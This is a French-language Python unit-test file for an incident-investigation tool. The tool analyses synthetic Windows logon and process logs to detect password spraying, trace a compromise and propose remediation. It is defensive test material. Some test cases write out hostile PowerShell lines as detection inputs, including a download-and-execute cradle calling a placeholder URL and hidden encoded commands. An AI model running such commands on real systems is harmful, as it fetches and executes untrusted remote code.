import json
import os
import tempfile
import unittest
from datetime import datetime, timedelta, timezone

from investigation import (ErreurChargement, Evenement, charger_logs, est_interne,
                           decoder_commande, etape1_detection, etape2_pivot,
                           etape3_chronologie, expliquer_etape1, expliquer_etape2,
                           expliquer_etape3, expliquer_etape4, etape4_plan,
                           evaluer_gravite, formater_heure, PRIORITES, ProfilIP,
                           ResultatDetection, ResultatPivot)
from tests.jeu_synthetique import (B64_GET_PROCESS, IP_BRUTE, IP_FP, IP_SPRAY_A, IP_SPRAY_B,
                                   chemin_jeu_synthetique, construire_jeu, ecrire_jeu)


def ecrire_tmp(objets):
    """Écrit objets en JSON dans un fichier temporaire supprimé en fin de test."""
    with tempfile.NamedTemporaryFile(
            "w", suffix=".json", delete=False, encoding="utf-8") as f:
        json.dump(objets, f)
    return f.name


class TestChargement(unittest.TestCase):
    def _tmp(self, objets):
        chemin = ecrire_tmp(objets)
        self.addCleanup(os.remove, chemin)
        return chemin

    def test_tri_et_formats_horodatage(self):
        chemin = self._tmp([
            {"timestamp": "2026-05-20T10:00:12.5Z", "event_id": 4624},
            {"timestamp": "2026-05-20T09:00:00+00:00", "event_id": 4625},
            {"timestamp": "2026-05-20T08:00:00Z", "event_id": 4688},
        ])
        evts = charger_logs(chemin)
        self.assertEqual([e.timestamp for e in evts],
                         sorted(e.timestamp for e in evts))
        self.assertEqual([e.event_id for e in evts], [4688, 4625, 4624])
        self.assertEqual(evts[0].timestamp.tzinfo, timezone.utc)

    def test_champs_manquants(self):
        chemin = self._tmp(
            [{"timestamp": "2026-05-20T08:00:00Z", "event_id": 4625, "details": None}])
        e = charger_logs(chemin)[0]
        self.assertEqual((e.host, e.account, e.src_ip, e.details), ("", "", None, {}))
        self.assertEqual((e.logon_type, e.result), (None, ""))

    def test_timestamp_invalide_ignore(self):
        chemin = self._tmp([{"event_id": 4625},
                            {"timestamp": "n'importe quoi", "event_id": 4625},
                            {"timestamp": "2026-05-20T08:00:00Z", "event_id": 4624}])
        self.assertEqual(len(charger_logs(chemin)), 1)

    def test_fichier_absent(self):
        with self.assertRaises(ErreurChargement):
            charger_logs("inexistant.json")

    def test_json_invalide(self):
        with tempfile.NamedTemporaryFile(
                "w", suffix=".json", delete=False, encoding="utf-8") as f:
            f.write("ceci n'est pas du JSON")
        self.addCleanup(os.remove, f.name)
        with self.assertRaises(ErreurChargement):
            charger_logs(f.name)

    def test_racine_non_liste(self):
        with self.assertRaises(ErreurChargement):
            charger_logs(self._tmp({"timestamp": "2026-05-20T08:00:00Z"}))

    def test_jeu_synthetique_charge(self):
        chemin = chemin_jeu_synthetique()
        self.addCleanup(os.remove, chemin)
        evts = charger_logs(chemin)
        self.assertEqual(len(evts), 2 + 12 + 12 + 7 + 15 + 11)
        self.assertEqual([e.timestamp for e in evts],
                         sorted(e.timestamp for e in evts))


class TestEtape1(unittest.TestCase):
    def _evts(self):
        chemin = chemin_jeu_synthetique()
        self.addCleanup(os.remove, chemin)
        return charger_logs(chemin)

    def setUp(self):
        self.det = etape1_detection(self._evts())

    def test_suspectes_et_categories(self):
        self.assertEqual(
            [(p.ip, p.categorie, p.nb_echecs, len(p.comptes)) for p in self.det.suspectes],
            [(IP_SPRAY_A, "spraying", 12, 6), (IP_SPRAY_B, "spraying", 15, 8),
             (IP_BRUTE, "force_brute", 11, 1)])

    def test_faux_positif_ecarte(self):
        self.assertEqual([(p.ip, p.categorie) for p in self.det.ecartees],
                         [(IP_FP, "faux_positif_probable")])

    def test_fenetre(self):
        a = self.det.suspectes[0]
        self.assertEqual((a.debut.strftime("%H:%M:%S"), a.fin.strftime("%H:%M:%S")),
                         ("09:00:00", "09:07:20"))
        self.assertEqual(a.hosts, ["SRV-FILE02"])

    def test_totaux(self):
        self.assertEqual(self.det.nb_echecs_total, 12 + 12 + 15 + 11)
        self.assertEqual(self.det.nb_ip_analysees, 4)

    def test_incoherence_result_comptee(self):
        self.assertEqual(self.det.nb_incoherences_result, 12 + 12 + 15 + 11)

    def test_est_interne(self):
        self.assertTrue(est_interne("10.8.0.50"))
        self.assertFalse(est_interne("203.0.113.200"))
        self.assertFalse(est_interne("pas-une-ip"))

    def test_seuils_parametrables(self):
        det = etape1_detection(self._evts(), seuil_echecs=13)
        self.assertEqual(det.suspectes[0].ip, IP_SPRAY_B)

    def test_formater_heure(self):
        dt = self.det.suspectes[0].debut
        self.assertEqual(formater_heure(dt, False), "09:00")
        self.assertEqual(formater_heure(dt, True), "20/05 09:00")

    def test_explication(self):
        t = expliquer_etape1(self.det, multi_jours=False)
        for attendu in ("=== ÉTAPE 1", "Recherche :", "Résultat :", "->", IP_SPRAY_A,
                        "12 échecs", "6 comptes", "09:00", "password spraying",
                        "force brute", IP_FP, "svc_web", "compte de service"):
            self.assertIn(attendu, t)

    def test_seuils_dans_explication(self):
        det = etape1_detection(self._evts(), seuil_echecs=13, seuil_comptes=7)
        t = expliquer_etape1(det, multi_jours=False)
        self.assertIn("à partir de 13 échecs", t)
        self.assertIn("au moins 7 comptes", t)
        self.assertNotIn("à partir de 10 échecs", t)

    def test_singulier_force_brute(self):
        t = expliquer_etape1(self.det, multi_jours=False)
        ligne = [l for l in t.splitlines() if IP_BRUTE in l][0]
        self.assertIn("1 compte,", ligne)
        self.assertNotIn("1 comptes", t)
        self.assertIn("machine visée : SRV-VPN01", ligne)

    def test_multi_jours_dans_explication(self):
        t = expliquer_etape1(self.det, multi_jours=True)
        self.assertIn("20/05 09:00", t)

    @staticmethod
    def _echecs(ip, comptes, n, event_id=4625):
        base = datetime(2026, 5, 20, 8, 0, tzinfo=timezone.utc)
        return [Evenement(base + timedelta(seconds=i), event_id, "H1",
                          comptes[i % len(comptes)], ip, 3, "", {})
                for i in range(n)]

    def test_interne_plusieurs_comptes_sous_seuil_ecartee(self):
        det = etape1_detection(self._echecs("10.1.1.1", ["a", "b", "c"], 12))
        self.assertEqual(det.suspectes, [])
        self.assertEqual([(p.ip, p.categorie) for p in det.ecartees],
                         [("10.1.1.1", "sous_seuil")])

    def test_sous_seuil_echecs_non_ecartee(self):
        det = etape1_detection(self._echecs("198.51.100.9", ["a", "b"], 9))
        self.assertEqual((det.suspectes, det.ecartees), ([], []))
        self.assertEqual(det.nb_ip_analysees, 1)

    def test_src_ip_absente_ignoree(self):
        evts = self._echecs(None, ["a"], 20) + self._echecs("", ["a"], 20)
        det = etape1_detection(evts)
        self.assertEqual((det.nb_echecs_total, det.nb_ip_analysees), (0, 0))
        self.assertEqual((det.suspectes, det.ecartees), ([], []))

    def test_4624_non_compte(self):
        evts = self._echecs("198.51.100.9", ["a"], 20, event_id=4624)
        det = etape1_detection(evts)
        self.assertEqual((det.nb_echecs_total, det.suspectes), (0, []))

    def test_aucune_ip_suspecte(self):
        t = expliquer_etape1(etape1_detection([]), multi_jours=False)
        self.assertIn("Aucune IP", t)


class TestEtape2(unittest.TestCase):
    def _pivot(self, supplementaires=()):
        chemin = ecrire_jeu(construire_jeu() + list(supplementaires))
        self.addCleanup(os.remove, chemin)
        evts = charger_logs(chemin)
        return etape2_pivot(evts, etape1_detection(evts))

    @staticmethod
    def _succes(ts, host, compte, ip, logon_type=3):
        return {"timestamp": ts, "event_id": 4624, "host": host, "account": compte,
                "src_ip": ip, "logon_type": logon_type, "result": "success",
                "details": {}}

    def test_compromission_synthetique(self):
        piv = self._pivot()
        self.assertEqual(
            [(x.ip, x.compte, x.host, x.t0.strftime("%H:%M"), x.logon_type)
             for x in piv.compromissions],
            [(IP_SPRAY_A, "u.trois", "SRV-FILE02", "09:12", 3)])
        self.assertEqual([p.ip for p in piv.non_abouties], [IP_SPRAY_B, IP_BRUTE])

    def test_succes_avant_premier_echec_ignore(self):
        # Connexion légitime à 09:59, avant le premier échec de l'IP (10:00)
        piv = self._pivot([self._succes("2026-05-20T09:59:00Z", "WKS-110", "v.a",
                                        IP_SPRAY_B)])
        self.assertEqual([x.ip for x in piv.compromissions], [IP_SPRAY_A])
        self.assertIn(IP_SPRAY_B, [p.ip for p in piv.non_abouties])

    def test_plusieurs_couples(self):
        piv = self._pivot([
            self._succes("2026-05-20T09:13:00Z", "SRV-FILE03", "u.un", IP_SPRAY_A),
            # même couple que l'original, plus tard : une seule compromission
            self._succes("2026-05-20T09:40:00Z", "SRV-FILE02", "u.trois", IP_SPRAY_A)])
        self.assertEqual(
            [(x.compte, x.host, x.t0.strftime("%H:%M")) for x in piv.compromissions],
            [("u.trois", "SRV-FILE02", "09:12"), ("u.un", "SRV-FILE03", "09:13")])
        self.assertEqual([p.ip for p in piv.non_abouties], [IP_SPRAY_B, IP_BRUTE])

    def test_explication(self):
        t = expliquer_etape2(self._pivot(), False)
        for attendu in ("=== ÉTAPE 2", "u.trois", "SRV-FILE02", "09:12", "a abouti",
                        "accès réseau", IP_SPRAY_B, "n'a pas abouti"):
            self.assertIn(attendu, t)

    def test_explication_sans_ip_suspecte(self):
        evts = []
        piv = etape2_pivot(evts, etape1_detection(evts))
        self.assertIn("rien à pivoter", expliquer_etape2(piv, False))


class TestEtape3(unittest.TestCase):
    def _chronos(self, supplementaires=()):
        chemin = ecrire_jeu(construire_jeu() + list(supplementaires))
        self.addCleanup(os.remove, chemin)
        evts = charger_logs(chemin)
        piv = etape2_pivot(evts, etape1_detection(evts))
        return etape3_chronologie(evts, piv)

    @staticmethod
    def _proc(ts, host, compte, process, parent, cmd=None):
        return {"timestamp": ts, "event_id": 4688, "host": host, "account": compte,
                "src_ip": None, "logon_type": None, "result": "success",
                "details": {"process": process, "parent_process": parent,
                            "command_line": cmd or process}}

    def test_chronologie_synthetique(self):
        chronos = self._chronos()
        self.assertEqual(len(chronos), 1)
        ch = chronos[0]
        self.assertEqual([(q.evt.timestamp.strftime("%H:%M"), q.nature) for q in ch.evenements], [
            ("09:12", "connexion_initiale"), ("09:14", "processus_suspect"),
            ("09:16", "tache_planifiee"), ("09:18", "creation_compte"),
            ("09:19", "ajout_groupe_privilegie"), ("09:25", "mouvement_lateral"),
            ("09:27", "processus_suspect")])
        self.assertEqual(ch.comptes_suivis, ["u.trois", "adm_tmp"])
        self.assertEqual(ch.evenements[-1].commande_decodee, "Get-Process")

    def test_activite_hors_perimetre_exclue(self):
        # le 4688 chrome.exe de p.alpha sur WKS-101 (09:30) n'apparaît pas
        ch = self._chronos()[0]
        self.assertNotIn("WKS-101", [q.evt.host for q in ch.evenements])
        self.assertNotIn("p.alpha", [q.evt.account for q in ch.evenements])

    def test_processus_benin_sur_host(self):
        ch = self._chronos([self._proc("2026-05-20T09:20:00Z", "SRV-FILE02", "u.trois",
                                       "notepad.exe", "explorer.exe")])[0]
        q = [x for x in ch.evenements if x.evt.timestamp.strftime("%H:%M") == "09:20"]
        self.assertEqual(len(q), 1)
        self.assertEqual(q[0].nature, "processus_benin")
        self.assertFalse(q[0].suspect)

    def test_processus_autre_compte_sur_host_et_chemin_complet(self):
        ch = self._chronos([self._proc(
            "2026-05-20T09:21:00Z", "SRV-FILE02", "autre",
            "C:\\Windows\\System32\\CMD.exe", "C:\\Program Files\\EXCEL.EXE")])[0]
        q = [x for x in ch.evenements if x.evt.timestamp.strftime("%H:%M") == "09:21"]
        self.assertEqual(q[0].nature, "processus_suspect")

    def test_effacement_journal(self):
        ch = self._chronos([{"timestamp": "2026-05-20T09:40:00Z", "event_id": 1102,
                             "host": "SRV-FILE02", "account": "u.trois", "src_ip": None,
                             "logon_type": None, "result": "success", "details": {}}])[0]
        self.assertEqual(ch.evenements[-1].nature, "effacement_journal")
        self.assertTrue(ch.evenements[-1].suspect)
        self.assertIn("journal de sécurité effacé", ch.evenements[-1].description)

    def test_decoder_commande(self):
        self.assertEqual(decoder_commande("powershell.exe -nop -w hidden -enc " + B64_GET_PROCESS),
                         "Get-Process")
        self.assertEqual(decoder_commande("powershell -EncodedCommand " + B64_GET_PROCESS),
                         "Get-Process")
        self.assertEqual(decoder_commande("powershell -enc %%%"), "non décodable")
        self.assertEqual(decoder_commande("powershell -enc"), "non décodable")
        self.assertIsNone(decoder_commande("chrome.exe"))

    def test_explication(self):
        t = expliquer_etape3(self._chronos(), False)
        for attendu in ("=== ÉTAPE 3", "SRV-FILE02", "09:12", "excel.exe", "\\OneDriveSyncHelper",
                        "adm_tmp", "Admins du domaine", "WKS-205", "Get-Process", "[!]",
                        "créé par l'attaquant"):
            self.assertIn(attendu, t)

    def _nature_proc(self, process, parent, cmd):
        ch = self._chronos([self._proc("2026-05-20T09:22:00Z", "SRV-FILE02", "u.trois",
                                       process, parent, cmd)])[0]
        return [q for q in ch.evenements
                if q.evt.timestamp.strftime("%H:%M") == "09:22"][0]

    def test_marqueurs_mots_entiers_faux_positifs(self):
        for process, cmd in (
                ("iexplore.exe", "C:\\Program Files\\Internet Explorer\\iexplore.exe"),
                ("notepad.exe", "notepad.exe C:\\hidden\\a.txt"),
                ("cmd.exe", "cmd.exe /c start -nopause")):
            q = self._nature_proc(process, "explorer.exe", cmd)
            self.assertEqual(q.nature, "processus_benin", cmd)
            self.assertFalse(q.suspect)

    def test_marqueurs_cas_positifs(self):
        for cmd in ("powershell.exe -nop -w hidden -enc JABjAD0A",
                    "powershell -EncodedCommand " + B64_GET_PROCESS,
                    "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://x')",
                    "powershell -c iex(foo)",
                    "powershell -c (New-Object Net.WebClient).DownloadString('http://x')"):
            q = self._nature_proc("powershell.exe", "explorer.exe", cmd)
            self.assertEqual(q.nature, "processus_suspect", cmd)

    def test_commande_non_decodable_dans_evenement(self):
        q = self._nature_proc("powershell.exe", "explorer.exe", "powershell -enc %%%")
        self.assertEqual(q.commande_decodee, "non décodable")

    def test_connexion_benigne_sur_host(self):
        ch = self._chronos([{"timestamp": "2026-05-20T09:30:00Z", "event_id": 4624,
                             "host": "SRV-FILE02", "account": "u.trois", "src_ip": "10.8.0.5",
                             "logon_type": 2, "result": "success", "details": {}}])[0]
        q = [x for x in ch.evenements if x.evt.timestamp.strftime("%H:%M") == "09:30"][0]
        self.assertEqual(q.nature, "connexion")
        self.assertFalse(q.suspect)

    def test_ajout_groupe_non_privilegie(self):
        ch = self._chronos([{"timestamp": "2026-05-20T09:31:00Z", "event_id": 4732,
                             "host": "SRV-FILE02", "account": "u.trois", "src_ip": None,
                             "logon_type": None, "result": "success",
                             "details": {"group": "Comptabilité", "member": "u.trois"}}])[0]
        q = [x for x in ch.evenements if x.evt.timestamp.strftime("%H:%M") == "09:31"][0]
        self.assertEqual(q.nature, "ajout_groupe")
        self.assertFalse(q.suspect)

    def test_glose_explication(self):
        t = expliquer_etape3(self._chronos(), False)
        self.assertIn("contenu masqué", t)
        self.assertIn("téléchargement d'un fichier depuis Internet", t)

    def test_explication_vide(self):
        self.assertIn("aucune compromission", expliquer_etape3([], False))


class TestEtape4(unittest.TestCase):
    def _etapes(self, supplementaires=()):
        chemin = ecrire_jeu(construire_jeu() + list(supplementaires))
        self.addCleanup(os.remove, chemin)
        evts = charger_logs(chemin)
        det = etape1_detection(evts)
        piv = etape2_pivot(evts, det)
        chronos = etape3_chronologie(evts, piv)
        return det, piv, chronos

    def setUp(self):
        self.det, self.piv, self.chronos = self._etapes()
        self.actions = etape4_plan(self.det, self.piv, self.chronos)

    def test_actions_attendues(self):
        textes = " | ".join(a.action for a in self.actions)
        for attendu in ("Bloquer l'IP " + IP_SPRAY_A, "Bloquer l'IP " + IP_SPRAY_B,
                        "Bloquer l'IP " + IP_BRUTE,
                        "Isoler SRV-FILE02", "Réinitialiser le mot de passe de u.trois",
                        "Désactiver le compte adm_tmp",
                        "Retirer adm_tmp du groupe Admins du domaine",
                        "Supprimer la tâche planifiée \\OneDriveSyncHelper",
                        "Isoler WKS-205", "svc_web",
                        "Surveiller les comptes visés par " + IP_SPRAY_B + " (8)",
                        "Revoir la robustesse des mots de passe des 6 comptes visés par " + IP_SPRAY_A,
                        "Get-Process"):
            self.assertIn(attendu, textes)

    def test_pas_d_action_sans_fait(self):
        self.assertNotIn("journal", " ".join(a.fait + a.action for a in self.actions).lower())

    def test_journal_efface(self):
        efface = {"timestamp": "2026-05-20T09:30:00Z", "event_id": 1102, "host": "SRV-FILE02",
                  "account": "u.trois", "src_ip": None, "logon_type": None,
                  "result": "success", "details": {}}
        det, piv, chronos = self._etapes([efface])
        actions = etape4_plan(det, piv, chronos)
        siem = [a for a in actions if "SIEM" in a.action]
        self.assertEqual(len(siem), 1)
        self.assertEqual(siem[0].priorite, "COURT TERME")
        self.assertIn("journal", siem[0].fait.lower())

    def test_chaque_action_a_un_fait(self):
        self.assertTrue(all(a.fait and a.priorite in PRIORITES for a in self.actions))

    def test_dedoublonnage_et_tri(self):
        textes = [a.action for a in self.actions]
        self.assertEqual(len(textes), len(set(textes)))
        rangs = [PRIORITES.index(a.priorite) for a in self.actions]
        self.assertEqual(rangs, sorted(rangs))

    def test_gravite(self):
        self.assertEqual(evaluer_gravite(self.piv, self.chronos), "CRITIQUE")
        self.assertEqual(evaluer_gravite(ResultatPivot([], []), []), "FAIBLE")
        self.assertEqual(evaluer_gravite(ResultatPivot([], self.det.suspectes), []), "MODÉRÉE")
        self.assertEqual(evaluer_gravite(self.piv, []), "ÉLEVÉE")

    def test_explication(self):
        t = expliquer_etape4(self.actions, "CRITIQUE", self.piv, self.chronos,
                             len(self.det.suspectes))
        self.assertIn("=== ÉTAPE 4", t)
        self.assertIn("3 IP suspectes", t)
        self.assertIn("1 compromission", t)
        self.assertIn("rebond vers WKS-205", t)
        self.assertIn("Admins du domaine", t)
        self.assertNotIn("journal de sécurité effacé", t)
        self.assertIn("->", t)
        self.assertIn("CRITIQUE", t)

    def _prio(self, debut, actions=None):
        trouvees = [a for a in (actions or self.actions) if a.action.startswith(debut)]
        self.assertEqual(len(trouvees), 1, debut)
        return trouvees[0].priorite

    def test_priorites_attendues(self):
        self.assertEqual(self._prio("Retirer adm_tmp du groupe Admins du domaine"), "IMMÉDIAT")
        self.assertEqual(self._prio("Isoler WKS-205"), "IMMÉDIAT")
        self.assertEqual(self._prio("Isoler SRV-FILE02"), "IMMÉDIAT")
        self.assertEqual(self._prio("Supprimer la tâche planifiée"), "COURT TERME")
        self.assertEqual(self._prio("Vérifier le mot de passe du compte de service svc_web"),
                         "SUIVI")

    def test_groupe_non_privilegie_court_terme(self):
        ajout = {"timestamp": "2026-05-20T09:20:00Z", "event_id": 4732, "host": "SRV-FILE02",
                 "account": "u.trois", "src_ip": None, "logon_type": None,
                 "result": "success", "details": {"group": "Comptabilité", "member": "u.trois"}}
        actions = etape4_plan(*self._etapes([ajout]))
        self.assertEqual(self._prio("Retirer u.trois du groupe Comptabilité", actions),
                         "COURT TERME")

    def test_commande_non_decodable_utilise_la_ligne_brute(self):
        brut = "powershell.exe -enc !!!pas_du_base64"
        proc = {"timestamp": "2026-05-20T09:21:00Z", "event_id": 4688, "host": "SRV-FILE02",
                "account": "u.trois", "src_ip": None, "logon_type": None, "result": "success",
                "details": {"process": "powershell.exe", "parent_process": "explorer.exe",
                            "command_line": brut}}
        actions = etape4_plan(*self._etapes([proc]))
        self.assertTrue(any(a.action.endswith("analyser la commande : " + brut)
                            for a in actions))
        self.assertFalse(any("non décodable" in a.action for a in actions))

    def test_pas_de_faux_positif_pour_sous_seuil(self):
        det = self.det
        sous = ProfilIP("10.9.9.9", 12, ["a", "b"], ["H"], det.suspectes[0].debut,
                        det.suspectes[0].fin, "sous_seuil", "x")
        det2 = ResultatDetection(det.suspectes, det.ecartees + [sous], 0, 0, 0)
        actions = etape4_plan(det2, self.piv, self.chronos)
        self.assertEqual(sum("compte de service" in a.action for a in actions), 1)
        self.assertFalse(any("10.9.9.9" in a.fait for a in actions))

    def test_comptes_une_action_par_ip(self):
        surveiller = [a for a in self.actions if a.action.startswith("Surveiller")]
        revoir = [a for a in self.actions if a.action.startswith("Revoir")]
        self.assertEqual(len(surveiller), len(self.piv.non_abouties))
        self.assertEqual(len(revoir), sum(p.categorie == "spraying" for p in self.det.suspectes))
        self.assertTrue(all(a.priorite == "SUIVI" for a in surveiller + revoir))

    def test_deux_ip_meme_nombre_de_comptes(self):
        evts = []
        for k, ip in enumerate(("198.51.100.1", "198.51.100.2")):
            for i in range(14):
                evts.append({"timestamp": f"2026-05-20T12:{k * 10:02d}:{i:02d}Z",
                             "event_id": 4625, "host": "H", "account": f"x.{i % 7}",
                             "src_ip": ip, "logon_type": 3, "result": "success",
                             "details": {}})
        chemin = ecrire_jeu(evts)
        self.addCleanup(os.remove, chemin)
        e = charger_logs(chemin)
        det = etape1_detection(e)
        piv = etape2_pivot(e, det)
        actions = etape4_plan(det, piv, etape3_chronologie(e, piv))
        for debut in ("Surveiller", "Revoir"):
            self.assertEqual(sum(a.action.startswith(debut) for a in actions), 2)

    def test_jargon_glose(self):
        textes = " ".join(a.action for a in self.actions)
        self.assertIn("MFA (double authentification)", textes)
        self.assertIn("(le déconnecter partout)", textes)


if __name__ == "__main__":
    unittest.main()
